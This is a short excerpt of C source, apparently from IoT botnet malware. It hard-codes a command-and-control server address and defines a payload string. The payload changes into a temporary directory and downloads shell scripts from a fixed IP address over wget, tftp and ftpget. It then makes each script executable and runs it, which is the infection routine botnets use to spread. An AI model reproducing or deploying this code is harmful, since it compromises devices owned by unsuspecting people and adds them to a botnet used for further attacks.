...
unsigned char *commServer[] = { "186.207.72.7:606" }; //216.158.238.34:42516   0 - 65535

char *payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.100.17/bins.sh; chmod +x bins.sh; sh bins.sh; tftp 206.189.100.17 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 206.189.100.17; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.100.17 ftp1.sh ftp1.sh; sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh *";
